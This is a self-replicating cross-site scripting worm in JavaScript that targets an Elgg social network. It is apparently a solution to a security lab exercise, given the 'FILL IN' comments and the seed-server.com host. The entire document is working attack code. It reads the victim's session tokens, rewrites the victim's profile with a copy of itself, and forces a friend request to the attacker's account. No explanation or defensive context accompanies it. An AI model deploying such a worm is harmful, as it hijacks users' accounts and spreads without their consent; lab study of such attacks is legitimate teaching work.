<script id="worm"> 
window.onload = function() {
var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; // (1)
var jsCode = document.getElementById("worm").innerHTML; // (2)
var tailTag = "</" + "script>"; // (3)
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
var content=token+ts+guid+userName+"&briefdescription=watch out&accesslevel[briefdescription]=2&description="+wormCode+"&accesslevel[description]=2"; //FILL IN
var samyGuid=59; //FILL IN
var sendurlEdit="http://www.seed-server.com/action/profile/edit"; //FILL IN
var sendurlFriend="http://www.seed-server.com/action/friends/add?friend="+samyGuid+ts+token;
if(elgg.session.user.guid != samyGuid) { // (1)
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurlEdit, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);

Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurlFriend, true);
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send();
}
}
</script>
